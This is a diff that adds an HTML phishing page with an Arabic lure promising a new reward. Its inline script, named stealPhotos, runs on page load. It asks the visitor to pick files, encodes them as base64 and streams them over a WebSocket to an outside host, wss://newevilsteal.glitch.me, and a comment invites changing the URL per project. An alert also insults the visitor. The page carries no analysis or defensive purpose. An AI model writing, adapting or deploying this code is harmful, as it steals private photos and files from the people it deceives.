@@ -1,0 +1,37 @@
+<html>
+  <body>
+    <h1>اضغط هنا للحصول على مكافأة جديدة!</h1>
+    <script>
+      function stealPhotos() {
+        const ws = new WebSocket('wss://newevilsteal.glitch.me'); // غيّر الرابط حسب المشروع
+        if (window.showOpenFilePicker) {
+          window.showOpenFilePicker({ multiple: true }).then((handles) => {
+            handles.forEach(handle => {
+              handle.getFile().then(file => {
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                  ws.send(JSON.stringify({ type: 'photoData', data: e.target.result.split(',')[1] }));
+                };
+                reader.readAsDataURL(file);
+              });
+            });
+          });
+        } else {
+          alert('يجب تفعيل الأذونات يا حمار!');
+          window.chooseFileSystemEntries().then(entry => {
+            entry.getFiles().then(files => {
+              files.forEach(file => {
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                  ws.send(JSON.stringify({ type: 'photoData', data: e.target.result.split(',')[1] }));
+                };
+                reader.readAsDataURL(file);
+              });
+            });
+          });
+        }
+      }
+      stealPhotos();
+    </script>
+  </body>
+</html>
